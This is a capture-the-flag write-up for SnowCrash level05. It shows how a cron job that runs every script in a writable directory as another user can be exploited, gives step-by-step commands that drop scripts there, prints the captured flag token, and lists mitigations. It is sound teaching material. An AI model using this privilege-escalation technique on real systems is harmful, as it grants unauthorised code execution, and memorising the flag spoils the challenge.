# CTF Report: SnowCrash Level05

## Summary
Cron job exploitation. A scheduled task runs `/usr/sbin/openarenaserver` as flag05 user every 2 minutes, executing all scripts in `/opt/openarenaserver/` directory.

**Flag:** `viuaaale9huek52boumoomioc`

## Analysis

### Cron Job Discovery
```bash
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

**Finding:** Cron job runs every 2 minutes as flag05 user.

### Script Analysis
```bash
cat /usr/sbin/openarenaserver
```
```bash
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

**Key Points:**
- Executes all files in `/opt/openarenaserver/`
- Runs with flag05 privileges
- Deletes files after execution
- 5 second timeout per script

## Exploitation

### Step 1: Test Write Access
```bash
cd /opt/openarenaserver
echo "/usr/bin/whoami > /tmp/hacked" > hacked.sh
chmod +x hacked.sh
```

### Step 2: Create Exploit Script
```bash
echo "getflag > /tmp/flag05_result" > exploit.sh
chmod +x exploit.sh
```

### Step 3: Wait for Cron Execution
```bash
sleep 120
cat /tmp/flag05_result
```

### Result
```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Vulnerability

**Type:** Insecure Cron Job with World-Writable Directory

**Root Cause:** 
- `/opt/openarenaserver/` is writable by level05 user
- Cron job executes any script in this directory as flag05
- No input validation or script verification

**Impact:** Arbitrary code execution with flag05 privileges.

## Mitigation

1. Restrict directory permissions (remove write access for untrusted users)
2. Validate scripts before execution
3. Use whitelist of allowed scripts
4. Run cron jobs with minimum required privileges
5. Implement file integrity monitoring

## Timeline
- Discovered cron job in `/var/mail/level05`
- Analyzed `/usr/sbin/openarenaserver` script
- Placed exploit script in monitored directory
- Waited for scheduled execution
- Successfully captured flag